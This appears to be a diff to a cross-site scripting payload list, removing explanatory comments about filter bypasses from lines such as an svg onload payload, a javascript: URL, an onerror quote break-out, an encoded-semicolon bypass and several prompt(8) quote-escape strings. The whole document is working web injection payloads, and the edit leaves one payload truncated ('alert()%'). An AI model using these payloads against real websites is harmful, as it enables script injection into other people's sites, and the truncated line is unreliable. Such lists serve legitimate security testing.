@@ -1,7 +1,7 @@
-<svg/onload=alert(0);  # incompletly tag
-200)%3B alert()%3B   # the javascript filter ";" and remove any word nest it so we replace any filtered word with encoded it.
-javascript:onclick=alert(100);  # it javascript code in url , Note : it displayed it in browsers but web apps it work.
-'onerror=alert(111)// # 
+<svg/onload=alert(0);
+200)%3B alert()%
+javascript:onclick=alert(100);
+'onerror=alert(111)//
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
